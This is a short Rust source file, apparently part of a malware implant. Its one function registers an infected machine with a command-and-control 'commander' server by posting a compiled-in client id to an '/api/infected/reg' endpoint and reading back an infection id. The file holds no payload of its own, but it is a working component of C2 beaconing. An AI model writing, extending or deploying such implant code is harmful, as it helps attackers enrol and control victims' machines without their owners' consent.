use std::time::Duration;

use anyhow::Result;
use reqwest::Client;
use serde_json::{Value, json};

use crate::constants::compiled::{self, CCID, HTTP_URL};

///! Request the iid from the commander, using th ccid.
pub async fn request_iid() -> Result<String> {
    let client = Client::new();

    let res = client
        .post(HTTP_URL("/api/infected/reg"))
        .json(&json!({
            "ccid": CCID
        }))
        .timeout(Duration::from_secs(3))
        .send()
        .await?
        .error_for_status()?;

    let body: Value = res.json().await?;

    Ok(String::from(
        body["iid"]
            .as_str()
            .ok_or(anyhow::anyhow!("Failed to get iid from body!"))?,
    ))
}
